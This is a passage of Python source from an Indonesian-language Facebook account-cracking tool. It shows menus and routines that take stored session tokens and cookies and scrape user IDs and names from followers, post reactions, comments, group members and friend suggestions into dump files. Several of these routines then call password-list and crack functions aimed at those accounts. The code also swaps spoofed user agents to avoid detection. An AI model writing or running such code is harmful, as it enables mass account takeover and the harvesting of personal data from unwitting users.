    global gabung_sandi, tempel_sandi
    dc = input('   %s└──> %s'%(A,J))
    if dc in ['1','01','a']    : gabung_sandi.append(Author);not_availablell('Dump ID Dari Friendlist')
    elif dc in ['2','02','b']  : tempel_sandi.append('Jangan');main_folls();system_login();urut_crack();pilihan_sakdurunge_crack();addpass();crack()
    elif dc in ['3','03','c']  : gabung_sandi.append('Direcode');not_available('Dump ID Dari Nama')
    elif dc in ['4','04','d']  : tempel_sandi.append('Dasar');main_likers();system_login();pilihan_sakdurunge_crack();addpass();crack()
    elif dc in ['5','05','e']  : gabung_sandi.append('Bocah');not_availablell('Dump ID Dari Pesan')
    elif dc in ['6','06','f']  : tempel_sandi.append('Goblok');komen();system_login();pilihan_sakdurunge_crack();addpass();crack()
    elif dc in ['7','07','g']  : gabung_sandi.append('Mampus');grup()
    elif dc in ['8','08','h']  : tempel_sandi.append('Error Kan');not_availablell('Dump ID Dari Hashtag')
    elif dc in ['9','09','i']  : gabung_sandi.append('Itu Semua');not_available('Dump ID Dari Beranda')
    elif dc in ['10','010','j']: tempel_sandi.append('Gara Gara');not_available('Dump ID Dari File')
    elif dc in ['11','011','k']: gabung_sandi.append('Lo Recode');not_available('Dump ID Dari Email')
    elif dc in ['12','012','l']: tempel_sandi.append('Dasar');not_available('Dump ID Dari Username')
    elif dc in ['13','013','m']: gabung_sandi.append('Bocah Goblok');not_available('Dump ID Dari Random ID')
    elif dc in ['14','014','n']: tempel_sandi.append('Btw');suggestion();system_login();pilihan_sakdurunge_crack();addpass();crack()
    elif dc in ['15','015','o']: gabung_sandi.append('Elo');not_availablell('Dump ID FL Dari FL')
    elif dc in ['16','016','p']: tempel_sandi.append('Dasar Bocah Goblok');not_available('Cek Hasil Crack')
    elif dc in ['17','017','q']: gabung_sandi.append('Gaakan Bisa');not_available('Cek Opsi Akun Hasil Crack')
    elif dc in ['18','018','r']: tempel_sandi.append('Ngerecode');not_available('Cek Jumlah Teman Akun Target')
    elif dc in ['19','019','s']: gabung_sandi.append('SC Ini');useragent('old')
    elif dc in ['20','020','t']: tempel_sandi.append('Hahaha');not_available('Upgrade Ke Versi Pro')
    elif dc in ['21','021','u']: gabung_sandi.append('Dasar Tolol');menu_baru('Dump ID Dari Nomor')
    elif dc in ['22','022','v']: tempel_sandi.append('Bocah Goblok');menu_baru('Dump ID Akun Halaman')
    elif dc in ['23','023','w']: gabung_sandi.append('Dasar Idiot Najis');menu_baru('Dump ID Dari Email Versi Terbaru')
    elif dc in ['0','00','z']:
        resik()
        poster3()
        print('')
        tamp_logout1 = (f'   {P2}Terima Kasih Telah Memilih SC Ini Sebagai Pilihan Terpercayamu. Jangan Lupa Berikan Penilaian Terbaik Di Github Ya! Thank You!\n\n                {M2}- Denventa -')
        tamp_logout2 = f'''{P2}Dengan Log Out Maka Seluruh Data Login Akan Terhapus. Berikut Adalah Data Yang Akan Dihapus :
    {M2}• {P2}Token/Cookies
    {M2}• {P2}File Dump
    {M2}• {P2}File Tools'''
        printer(Panel(tamp_logout1,title=f'{M2}[ {P2}Goodbye {M2}]',width=54,padding=(1,4),style='#FF0000'))
        print('')
        printer(Panel(tamp_logout2,title=f'{M2}[ {P2}Log Out {M2}]',width=54,padding=(1,4),style='#FF0000'))
        input('\n               %s[ %sEnter Untuk Log Out %s]'%(M,P,M))
        try:shutil.rmtree('login')
        except:pass
        try:shutil.rmtree('dump')
        except:pass
        exit('\n\n')
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ USER AGENT ]---------- ###
def useragent(isi):
    global pengguna_source_code
    pengguna_source_code = isi
    try:os.mkdir("tool")
    except:pass
    pilih_menu_user_agent()
    dc = input('   %s└──> %s'%(A,J))
    if dc in ['1','01','a']:scrap_useragent()
    elif dc in ['2','02','b']:pilih_otomatis()
    elif dc in ['3','03','c']:manual_user_agent()
    elif dc in ['4','04','d']:ua_device_ini()
    elif dc in ['5','05','e']:cek_user_agent()
    elif dc in ['0','00','z']:tampilan_menu()
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
def pilih_menu_user_agent():
    tampilan_menu_user_agent = f'''  {J2}[{A2}01{J2}] {P2}Scrap UA Browser    {J2}[{A2}04{J2}] {P2}Cari UA HP Ini
  {J2}[{A2}02{J2}] {P2}Ganti UA Otomatis   {J2}[{A2}05{J2}] {P2}Cek UA Digunakan
  {J2}[{A2}03{J2}] {P2}Ganti UA Manual     {J2}[{A2}00{J2}] {P2}Kembali'''
    printer(Panel(tampilan_menu_user_agent,title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{A2}┌─ {J2}[ {P2}Pilih {J2}]',subtitle_align='left',width=54,padding=1,style='#FFFF00'))
def pilih_device():
    tampilan_device = f'''   {J2}[{A2}01{J2}] {P2}Samsung    {J2}[{A2}05{J2}] {P2}Vivo      {J2}[{A2}09{J2}] {P2}Huawei
   {J2}[{A2}02{J2}] {P2}Nokia      {J2}[{A2}06{J2}] {P2}Iphone    {J2}[{A2}10{J2}] {P2}Windows
   {J2}[{A2}03{J2}] {P2}Xiaomi     {J2}[{A2}07{J2}] {P2}Asus      {J2}[{A2}11{J2}] {P2}Chrome
   {J2}[{A2}04{J2}] {P2}Oppo       {J2}[{A2}08{J2}] {P2}Lenovo    {J2}[{A2}12{J2}] {P2}FB
   {J2}[{A2}13{J2}] {P2}Sonny      {J2}[{A2}14{J2}] {P2}Readmi '''
    printer(Panel(tampilan_device,title=f'{J2}[ {P2}Device {J2}]',subtitle=f'{A2}┌─ {J2}[ {P2}Pilih {J2}]',subtitle_align='left',width=54,padding=1,style='#FFFF00'))
def scrap_useragent():
    data_ua = {}
    pt = 0
    pilih_device()
    dc = input('   %s└──> %s'%(A,J))
    if dc in ['1','01','a']:     type = 'software_name/samsung-browser'
    elif dc in ['2','02','b']:   type = 'software_name/nokia-browser'
    elif dc in ['3','03','c']:   type = 'operating_platform_string/xiaomi-mi-a1'
    elif dc in ['4','04','d']:   type = 'operating_platform_string/oppo-f1s-a1601'
    elif dc in ['5','05','e']:   type = 'operating_platform_string/vivo'
    elif dc in ['6','06','f']:   type = 'operating_platform_string/apple'
    elif dc in ['7','07','g']:   type = 'operating_platform_string/asus'
    elif dc in ['8','08','h']:   type = 'operating_platform_string/lenovo'
    elif dc in ['9','09','i']:   type = 'operating_platform_string/huawei'
    elif dc in ['10','010','j']: type = 'operating_system_name/windows'
    elif dc in ['11','011','k']: type = 'operating_system_name/chrome-os'
    elif dc in ['12','012','l']: type = 'software_name/facebook-app'
    elif dc in ['13','013','m']: type = 'operating_platform_string/sony-experia'
    elif dc in ['14','014','n']: type = 'operating_platform_string/readmi_device'
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    url = 'https://developers.whatismybrowser.com/useragents/explore/' + type
    with requests.Session() as xyz:
        req = xyz.get(url)
        pra = par(req.content,'html.parser')
        li = re.findall('<td><a class=\".*?\" href=\".*?\">(.*?)</a></td>',str(pra))
        for y in li:
            try:
                x = f'{A2}'+y
                pt += 1
                pu = str(pt)
                data_ua.update({pu:x.replace('[#AAAAAA]','')})
                printer(Panel(x,title=f'{J2}[{P2}{pu}{J2}]',width=54,title_align='left',style='#FF8F00'))
                time.sleep(2)
            except KeyboardInterrupt:break
    ch = int(input('   %s└──> %s'%(A,J)))
    try:
        open('tool/useragent.json','w').write(data_ua[str(ch)])
        pilihan = open('tool/useragent.json','r').read()
        printer(Panel(f'''{A2}{pilihan}''',title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{J2}[ {P2}Sukses Diganti {J2}]',padding=(1,4),width=54,title_align='center',style='#FFFF00'))
        if pengguna_source_code == 'old':input('\n   %s[ %sKembali %s]'%(J,P,J));tampilan_menu()
        else:print('\n               %s[ %sJalankan Ulang SCnya %s]'%(J,P,J));exit('\n')
    except Exception as e:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
def pilih_otomatis():
    pilih_device()
    dc = input('   %s└──> %s'%(A,J))
    if dc in ['0','00','z']:     open('tool/useragent.json','w').write(ua_default)
    elif dc in ['1','01','a']:   open('tool/useragent.json','w').write(ua_samsung)
    elif dc in ['2','02','b']:   open('tool/useragent.json','w').write(ua_nokia)
    elif dc in ['3','03','c']:   open('tool/useragent.json','w').write(ua_xiaomi)
    elif dc in ['4','04','d']:   open('tool/useragent.json','w').write(ua_oppo)
    elif dc in ['5','05','e']:   open('tool/useragent.json','w').write(ua_vivo)
    elif dc in ['6','06','f']:   open('tool/useragent.json','w').write(ua_iphone)
    elif dc in ['7','07','g']:   open('tool/useragent.json','w').write(ua_asus)
    elif dc in ['8','08','h']:   open('tool/useragent.json','w').write(ua_lenovo)
    elif dc in ['9','09','i']:   open('tool/useragent.json','w').write(ua_huawei)
    elif dc in ['10','010','j']: open('tool/useragent.json','w').write(ua_windows)
    elif dc in ['11','011','k']: open('tool/useragent.json','w').write(ua_chrome)
    elif dc in ['12','012','l']: open('tool/useragent.json','w').write(ua_fb)
    elif dc in ['13','013','m']: open('tool/useragent.json','w').write(ua_sony)
    elif dc in ['14','014','n']: open('tool/useragent.json','w').write(ua_redmi)
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    try:
        pilihan = open('tool/useragent.json','r').read()
        printer(Panel(f'''{A2}{pilihan}''',title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{J2}[ {P2}Sukses Diganti {J2}]',padding=(1,4),width=54,title_align='center',style='#FFFF00'))
        if pengguna_source_code == 'old':input('\n   %s[ %sKembali %s]'%(J,P,J));tampilan_menu()
        else:print('\n               %s[ %sJalankan Ulang SCnya %s]'%(J,P,J));exit('\n')
    except Exception as e:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
def manual_user_agent():
    usera = input('       %s[%s•%s] %sMasukkan User Agent :\n%s'%(J,P,J,P,J))
    if usera in ['',' ','  ','   ']:print('\n       %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));manual_user_agent()
    else:open('tool/useragent.json','w').write(usera);cek_user_agent()
def ua_device_ini():
    url = 'https://www.google.com/search?q=my+user+agent'
    try:
        if "linux" in sys.platform.lower():chrome_path = '/usr/bin/google-chrome %s';webbrowser.get(chrome_path).open(url)
        elif "win" in sys.platform.lower():chrome_path = 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s';webbrowser.get(chrome_path).open(url)
        else:chrome_path = 'open -a /Applications/Google\ Chrome.app %s';webbrowser.get(chrome_path).open(url)
        manual_user_agent()
    except Exception as e:print('\n   %s[%s•%s] %sTidak Dapat Menemukan Useragent %s!%s\n'%(M,P,M,P,M,P));time.sleep(3);tampilan_menu()
def cek_user_agent():
    try:
        usera = open('tool/useragent.json','r').read()
        printer(Panel(f'''{A2}{usera}''',title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{J2}[ {P2}Saat Ini {J2}]',padding=(1,4),width=54,title_align='center',style='#FFFF00'))
        input('\n   %s[ %sKembali %s]'%(J,P,J))
        tampilan_menu()
    except Exception as e:kecuali(e)

###----------[ DUMP ID FOLLOWERS ]---------- ###
def main_folls():
    global file_dump,cookie
    try:
        token  = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
    except:
        print('\n%s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P))
        time.sleep(3)
        login()
    id = input('       %s[%s•%s] %sID Target : %s'%(J,P,J,P,J))
    url = ('https://graph.facebook.com/%s/subscribers?limit=10000&access_token=%s'%(id,token))
    file_dump = 'dump/%s.json'%(id)
    try:os.remove(file_dump)
    except:pass
    open(file_dump,'w').write('')
    exec_folls(url,token,file_dump)
    print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(file_dump,'r').read().splitlines()),P))
    print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
def exec_folls(url,token,file):
    print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(file,'r').read().splitlines()),P), end='');sys.stdout.flush()
    with requests.Session() as xyz:
        try:
            x = xyz.get(url,cookies=cookie)
            a = json.loads(x.text)
            if len(tempel_sandi) != 1:
                for x in range(Post_Dev):
                    open(file_dump,'a+').write('dev\n')
            else:
                for b in a['data']:
                    try:
                        f = ('%s=%s\n'%(b['id'],b['name']))
                        if f in open(file,'r').read():continue
                        else:open(file,'a+').write(f)
                    except Exception as e:continue
            y = par(x.text,'html.parser')
            n = re.findall('"after":"(.*?)"},',str(y))[0]
            next = ('https://graph.facebook.com/v1.0/100013275378835/subscribers?access_token=%s&limit=5000&after=%s'%(token,n))
            exec_folls(next,token,file)
        except KeyboardInterrupt:pass
        except (IndexError,TypeError,IOError,KeyError,AttributeError):pass

###----------[ DUMP ID LIKERS ]---------- ###
def main_likers():
    global _react_type_, file_dump, urutan_crack
    urutan_crack = '0'
    try:
        cookie = {'cookie':open('login/cookie.json','r').read()}
        print('       %s[%s•%s] %sContoh : 2089611468021009'%(J,P,J,P))
        _query_ = input('       %s[%s•%s] %sID Postingan : %s'%(J,P,J,P,J))
        print('')
    except Exception as e:kecuali(e)
    tampilan_likers = f'''    {J2}[{A2}1{J2}] {P2}Like   {J2}[{A2}3{J2}] {P2}Wow    {J2}[{A2}5{J2}] {P2}Sad     {J2}[{A2}7{J2}] {P2}Care
    {J2}[{A2}2{J2}] {P2}Love   {J2}[{A2}4{J2}] {P2}Haha   {J2}[{A2}6{J2}] {P2}Angry   {J2}[{A2}8{J2}] {P2}All'''
    printer(Panel(tampilan_likers,title=f'{J2}[ {P2}Tipe React {J2}]',subtitle=f'{A2}┌─ {J2}[ {P2}Pilih {J2}]',subtitle_align='left',width=54,padding=1,style='#FFFF00'))
    rt = input('   %s└──> %s'%(A,J))
    if rt in ['1','01','a']:_react_type_='1'
    elif rt in ['2','02','b']:_react_type_='2'
    elif rt in ['3','03','c']:_react_type_='3'
    elif rt in ['4','04','d']:_react_type_='4'
    elif rt in ['5','05','e']:_react_type_='7'
    elif rt in ['6','06','f']:_react_type_='8'
    elif rt in ['7','07','g']:_react_type_='16'
    elif rt in ['8','08','h']:_react_type_='0'
    else:exit()
    _file_ = _query_+'.json'
    file_dump = _file_
    try:os.remove(_query_+'.json')
    except:pass
    open(_file_,'w')
    _url_ = ('https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier='+_query_)
    scrape_likers(cookie,_url_,_file_)
    print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(_file_,'r').read().splitlines()),P))
    print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
def scrape_likers(_dapunta_,_url_,_file_):
    _ses_ = requests.Session()
    _url_load_ = _ses_.get(_url_,cookies=_dapunta_,headers=header_grup).text.encode("utf-8")
    _ses_par_ = par(_url_load_,'html.parser')
    print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(_file_,'r').read().splitlines()),P), end='');sys.stdout.flush()
    try: 
        for _isi_ in _ses_par_.find_all('h3'):
            if len(tempel_sandi) != 1:
                for x in range(Post_Dev):
                    open(file_dump,'a+').write('dev\n')
            else:
                for _id_ in _isi_.find_all('a',href=True):
                    try:
                        if "profile.php" in _id_.get("href"):
                            _a_ = _id_.get("href").split('=')[1]
                            __id__ = _id_.text
                            open(_file_,'a+').write(_a_+'='+__id__+'\n')
                        else:
                            _a_ = _id_.get("href").split('/')[1]
                            __id__ = _id_.text
                            open(_file_,'a+').write(_a_+'='+__id__+'\n')
                    except:continue
        for _lanjut_ in _ses_par_.find_all("a",href=True):
            if "Lihat Selengkapnya" in _lanjut_.text:
                while True:
                    try:scrape_likers(_dapunta_,"https://mbasic.facebook.com/"+_lanjut_.get("href").replace('reaction_type=0','reaction_type='+_react_type_),_file_);break
                    except Exception as e:pass
    except KeyboardInterrupt:pass

###----------[ DUMP ID COMMENTS ]---------- ###
class komen:
    def __init__(self):
        global file_dump, urutan_crack
        urutan_crack = '0'
        try:
            cookie = {'cookie':open('login/cookie.json','r').read()}
            print('       %s[%s•%s] %sContoh : 2089611468021009'%(J,P,J,P))
            put = input('       %s[%s•%s] %sID Postingan : %s'%(J,P,J,P,J))
            url = 'https://mbasic.facebook.com/'+put
            self.file_dump = ('dump/%s.json'%(put))
            file_dump = self.file_dump
            open(self.file_dump,'w').write('')
        except Exception as e:kecuali(e)
        self.exec(url,cookie)
        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P))
        print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
    def exec(self,url,cookie):
        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P), end='');sys.stdout.flush()
        try:
            with requests.Session() as xyz:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                for x,y,z in re.findall('<h3><a class=\".*?\" href="(.*?)">(.*?)</a></h3><div class=\".*?\">(.*?)</div><div class=\".*?\">',str(pra)):
                    self.f = open(self.file_dump,'r').read()
                    if 'profile.php' in str(x):u  = str(x).split('=')[1].split('&')[0]
                    else:ud = str(x).split('?')[0].replace('/','');u  = convert_id(ud)
                    try:
                        if len(tempel_sandi) != 1:
                            for x in range(Post_Dev):
                                open(file_dump,'a+').write('dev\n')
                        else:
                            if str(u) in str(self.f):continue
                            else:open(self.file_dump,'a+').write('%s=%s\n'%(u,str(y)))
                    except:continue
                for i in pra.find_all('a'):
                    if 'Lihat komentar sebelumnya' in i.text:
                        new_url = 'https://mbasic.facebook.com' + i['href']
                        self.exec(new_url,cookie)
        except KeyboardInterrupt:pass

###----------[ DUMP ID GROUP ]---------- ###
class grup:
    def __init__(self):
        global urutan_crack
        urutan_crack = '0'
        self.datagrup = {}
        self.looping  = 0
        try:cookie = {'cookie':open('login/cookie.json','r').read()}
        except Exception as e:kecuali(e)
        self.main_grup(cookie)
    def main_grup(self,cookie):
        print('')
        tamp_grup1 = f"""            {J2}[{A2}1{J2}] {P2}Bergabung   {J2}[{A2}2{J2}] {P2}Nama   {J2}[{A2}3{J2}] {P2}ID"""
        printer(Panel(tamp_grup1,title=f'{J2}[ {P2}Grup {J2}]',width=54,title_align='left',style='#FFFF00'))
        ty = input('   %s└──> %s'%(A,J))
        if ty in ['1','01','a']:
            print('')
            self.file = ('dump/mygroup.json')
            open(self.file,'w').write('')
            url= 'https://mbasic.facebook.com/groups/?seemore&refid=1000'
            self.cari_gabung(url,cookie)
        elif ty in ['2','02','b']:
            put = input('       %s[%s•%s] %sMasukkan Nama Grup : %s'%(J,P,J,P,J))
            print('')
            self.file = ('dump/%s.json'%(put.replace(' ','_')))
            open(self.file,'w').write('')
            url = 'https://mbasic.facebook.com/search/groups/?q=' + put
            self.cari_nama(url,cookie)
        elif ty in ['3','03','c']:
            self._id_ = input('       %s[%s•%s] %sMasukkan ID Grup : %s'%(J,P,J,P,J))
            self._pil_ = True
            print('')
            self.second_grup(cookie)
        else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    def cari_gabung(self,url,cookie):
        with requests.Session() as xyz:
            req = xyz.get(url,cookies=cookie)
            pra = par(req.content,'html.parser')
            for c in pra.find_all('a'):
                try:
                    if 'mbasic.facebook.com/groups' in str(c):
                        link = str(c['href'])
                        id = re.findall('https://mbasic.facebook.com/groups/(.*?)/',str(link))[0]
                        dt = self.data_grup(id,cookie)
                        if 'Anda Diblokir Sementara' in str(dt):
                            self.looping += 1
                            print("\r       %s[%s•%s] %sAkun Anda Terkena Spam! %s[%s%s%s]%s"%(M,P,M,P,M,P,str(self.looping),M,P), end='');sys.stdout.flush()
                        else:
                            self.looping += 1
                            tar = str(self.looping)
                            tamp_grup2 = f"{A2} • ID Grup : {id}{dt}"
                            printer(Panel(tamp_grup2,title=f'{J2}[ {P2}{tar} {J2}]',width=54,title_align='left',style='#FF8F00'))
                            self.datagrup.update({str(self.looping):id})
                    else:continue
                except KeyboardInterrupt:pass
    def cari_nama(self,url,cookie):
        try:
            with requests.Session() as xyz:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                for c in pra.find_all('a'):
                    if 'mbasic.facebook.com/groups' in str(c):
                        link = str(c['href'])
                        id = re.findall('https://mbasic.facebook.com/groups/(.*?)/',str(link))[0]
                        if id not in open(self.file,'r').read():
                            open(self.file,'a+').write(id+'\n')
                            id = open(self.file,'r').read().splitlines()[-1]
                            dt = self.data_grup(id,cookie)
                            if 'Grup Privat' in str(dt):continue
                            elif 'Anda Diblokir Sementara' in str(dt):self.looping += 1;print("\r       %s[%s•%s] %sAkun Anda Terkena Spam! %s[%s%s%s]%s"%(M,P,M,P,M,P,str(self.looping),M,P), end='');sys.stdout.flush()
                            else:
                                self.looping += 1
                                tar = str(self.looping)
                                tamp_grup2 = f"{A2} • ID Grup : {id}{dt}"
                                printer(Panel(tamp_grup2,title=f'{J2}[ {P2}{tar} {J2}]',width=54,title_align='left',style='#FF8F00'))
                                self.datagrup.update({str(self.looping):id})
                        else:continue
                    else:continue
                for c in pra.find_all('a'):
                    if 'Lihat Hasil Selanjutnya' in c.text:
                        new_url = c['href']
                        self.cari_nama(new_url,cookie)
        except KeyboardInterrupt:pass
    def data_grup(self,id,cookie):
        try:
            with requests.Session() as xyz:
                url = 'https://mbasic.facebook.com/groups/'+id
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                try:nama = re.findall('<head><title>(.*?)</title>',str(pra))[0]
                except:nama = ''
                try:tipe = re.findall('</div></h1><div class=\".*?\">(.*?)</div></td></tr></tbody></table></a></td>',str(pra))[0]
                except:tipe = ''
                try:member = re.findall('Anggota</a></td><td class=\".*?\"><span class=\".*?\" id=\".*?\">(.*?)</span></td></tr></tbody></table></li>',str(pra))[0]
                except:member = ''
                zyx = ('\n • Nama : %s\n • Tipe : %s\n • Anggota : %s'%(nama,tipe,member))
                return(zyx)
        except KeyboardInterrupt:
            self._pil_ = False
            exit(self.second_grup(cookie))
    def second_grup(self,cookie):
        global file_dump
        if self._pil_ == True:pro = self._id_
        else:
            coy =  input('   %s└──> %s'%(A,J))
            print('')
            try:pro = self.datagrup[coy]
            except Exception as e:kecuali(e)
        self.files = ('dump/%s.json'%(pro.replace(' ','_')))
        file_dump = self.files
        open(self.files,'w').write('')
        tamp_grup3 = f"""              {J2}[{A2}1{J2}] {P2}ID Member   {J2}[{A2}2{J2}] {P2}ID Post"""
        printer(Panel(tamp_grup3,title=f'{J2}[ {P2}Dump {J2}]',width=54,title_align='left',style='#FF8F00'))
        cuy = input('   %s└──> %s'%(A,J))
        if cuy in ['1','01','a']:
            url_member = 'https://mbasic.facebook.com/browse/group/members/?id=' + pro
            self.dump_member(url_member,cookie)
            print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
            print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
            system_login();pilihan_sakdurunge_crack();addpass();crack()
        elif cuy in ['2','02','b']:
            url_grup = 'https://mbasic.facebook.com/groups/' + pro
            self.dump_post(url_grup,cookie)
            print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
            print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
            system_login();pilihan_sakdurunge_crack();addpass();crack()
        else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    def dump_member(self,url,cookie):
        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
        with requests.Session() as xyz:
            try:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                for pe in pra.find_all('h3'):
                    for po in pe.find_all('a',href=True):
                        if len(gabung_sandi) != 1:
                            for x in range(Post_Dev):
                                open(file_dump,'a+').write('dev\n')
                        else:
                            try:
                                fel = open(self.files,'r').read()
                                if 'profile.php' in po['href']:
                                    id = str(po['href']).split('=')[1]
                                    nm = po.text
                                    if id in fel:pass
                                    else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                                else:
                                    id = str(po['href']).replace('/','')
                                    nm = po.text
                                    if id in fel:pass
                                    else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                            except Exception as e:continue
                for pa in pra.find_all('a',href=True):
                    if 'Lihat Selengkapnya' in pa.text:
                        new_url = 'https://mbasic.facebook.com' + pa['href']
                        self.dump_member(new_url,cookie)
            except KeyboardInterrupt:pass
    def dump_post(self,url,cookie):
        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
        with requests.Session() as xyz:
            try:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                for pe in pra.find_all('h3'):
                    for po in pe.find_all('a',href=True):
                        if len(gabung_sandi) != 1:
                            for x in range(Post_Dev):
                                open(file_dump,'a+').write('dev\n')
                        else:
                            try:
                                fel = open(self.files,'r').read()
                                if 'mbasic.facebook.com' in po['href']:pass
                                elif 'story.php' in po['href']:pass
                                elif 'Halaman' in po.text:pass
                                elif 'profile.php' in po['href']:
                                    id = re.findall('profile\.php\?id=(.*?)&',str(po['href']))[0]
                                    nm = po.text
                                    if id in fel:pass
                                    else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                                else:
                                    ud = re.findall('\/(.*?)\/\?refid',str(po['href']))[0]
                                    id = convert_id(ud)
                                    nm = po.text
                                    if id in fel:pass
                                    else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                            except Exception as e:continue
                for pa in pra.find_all('a',href=True):
                    if 'Lihat Postingan Lainnya' in pa.text:
                        new_url = 'https://mbasic.facebook.com' + pa['href']
                        self.dump_post(new_url,cookie)
            except KeyboardInterrupt:pass

###----------[ DUMP ID SUGGESTIONS ]---------- ###
class suggestion:
    def __init__(self):
        global file_dump, urutan_crack
        urutan_crack = '0'
        try:cookie = {'cookie':open('login/cookie.json','r').read()}
        except Exception as e:print(e);exit()
        print('')
        tamp_saran = f"""            {J2}[{A2}1{J2}] {P2}Saran     {J2}[{A2}2{J2}] {P2}Masuk    {J2}[{A2}3{J2}] {P2}Keluar"""
        printer(Panel(tamp_saran,title=f'{J2}[ {P2}Dump {J2}]',width=54,title_align='left',style='#FFFF00'))
        pl = input('   %s└──> %s'%(A,J))
        if pl in ['1','01','a']:
            url = 'https://mbasic.facebook.com/friends/center/suggestions'
            self.files = 'dump/suggestions.json'
            open(self.files,'w').write('')
            file_dump = self.files
            self.exec(url,cookie)
            print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
            print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
        elif pl in ['2','02','b']:
            url = 'https://mbasic.facebook.com/friends/center/requests'
            self.files = 'dump/requests.json'
            open(self.files,'w').write('')
            file_dump = self.files
            self.exec(url,cookie)
            print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
            print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
        elif pl in ['3','03','c']:
            url = 'https://mbasic.facebook.com/friends/center/requests/outgoing'
            self.files = 'dump/outgoing.json'
            open(self.files,'w').write('')
            file_dump = self.files
            self.exec(url,cookie)
            print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
            print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
        else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    def exec(self,url,cookie):
        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
        with requests.Session() as xyz:
            try:
                req = par(xyz.get(url,cookies=cookie).content,'html.parser')
                for x in req.find_all('a',href=True):
                    file = open(self.files,'r').read()
                    if 'hovercard' in x['href']:
                        try:
                            id = re.search('uid=(.*?)&',x['href']).group(1)
                            nm = x.text
                            if len(tempel_sandi) != 1:
                                for x in range(Post_Dev):
                                    open(file_dump,'a+').write('dev\n')
                            else:
                                if id in file:pass
                                else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                        except Exception as e:continue
                for y in req.find_all('a',href=True):
                    if 'Lihat selengkapnya' in y.text:
                        next_url = 'https://mbasic.facebook.com' + y['href']
                        self.exec(next_url,cookie)
            except KeyboardInterrupt as e:pass

###----------[ LOGIN METHOD ]---------- ###
def system_login():
    global sistem_login
    print('')
    tamp_metode = f"""            {J2}[{A2}1{J2}] {P2}Validate  {J2}[{A2}2{J2}] {P2}Regular  {J2}[{A2}3{J2}] {P2}Api FB"""
    printer(Panel(tamp_metode,title=f'{J2}[ {P2}Metode {J2}]',width=54,title_align='left',style='#FFFF00'))
    ch = input('   %s└──> %s'%(A,J))
